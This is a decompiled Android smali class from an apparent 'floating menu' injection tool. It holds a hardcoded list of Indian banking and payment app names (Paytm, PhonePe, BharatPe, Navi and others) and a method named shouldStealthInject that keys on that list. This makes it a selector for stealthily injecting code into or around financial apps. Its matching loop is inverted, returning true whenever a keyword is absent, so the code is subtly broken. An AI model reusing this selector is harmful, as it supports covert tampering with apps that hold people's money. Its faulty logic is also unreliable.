.class public Lcom/floatingmenu/BankingAppGuard;
.super Ljava/lang/Object;
.source "SourceFile"


# direct methods
.method public constructor <init>()V
    .registers 1

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static isBankingApp(Ljava/lang/String;)Z
    .registers 6

    const/4 v0, 0x0

    if-eqz p0, :cond_ret

    invoke-virtual {p0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_go

    :cond_ret
    return v0

    :cond_go
    invoke-virtual {p0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object p0

    const/16 v1, 0x10

    new-array v1, v1, [Ljava/lang/String;

    const-string v2, "paytm"

    aput-object v2, v1, v0

    const/4 v2, 0x1

    const-string v3, "tataneu"

    aput-object v3, v1, v2

    const/4 v2, 0x2

    const-string v3, "tatadigital"

    aput-object v3, v1, v2

    const/4 v2, 0x3

    const-string v3, "snapmint"

    aput-object v3, v1, v2

    const/4 v2, 0x4

    const-string v3, "yespay"

    aput-object v3, v1, v2

    const/4 v2, 0x5

    const-string v3, "moneyview"

    aput-object v3, v1, v2

    const/4 v2, 0x6

    const-string v3, "lxme"

    aput-object v3, v1, v2

    const/4 v2, 0x7

    const-string v3, "navi"

    aput-object v3, v1, v2

    const/16 v2, 0x8

    const-string v3, "airtel"

    aput-object v3, v1, v2

    const/16 v2, 0x9

    const-string v3, "bharatpe"

    aput-object v3, v1, v2

    const/16 v2, 0xa

    const-string v3, "saathi"

    aput-object v3, v1, v2

    const/16 v2, 0xb

    const-string v3, "abcd"

    aput-object v3, v1, v2

    const/16 v2, 0xc

    const-string v3, "supermoney"

    aput-object v3, v1, v2

    const/16 v2, 0xd

    const-string v3, "nextpay"

    aput-object v3, v1, v2

    const/16 v2, 0xe

    const-string v3, "epaynext"

    aput-object v3, v1, v2

    const/16 v2, 0xf

    const-string v3, "phonepe"

    aput-object v3, v1, v2

    array-length v2, v1

    :goto_loop
    if-ge v0, v2, :cond_false

    aget-object v3, v1, v0

    invoke-virtual {p0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_true

    add-int/lit8 v0, v0, 0x1

    goto :goto_loop

    :cond_false
    const/4 p0, 0x0

    return p0

    :cond_true
    const/4 p0, 0x1

    return p0
.end method

.method public static shouldStealthInject(Ljava/lang/String;)Z
    .registers 1

    invoke-static {p0}, Lcom/floatingmenu/BankingAppGuard;->isBankingApp(Ljava/lang/String;)Z

    move-result p0

    return p0
.end method
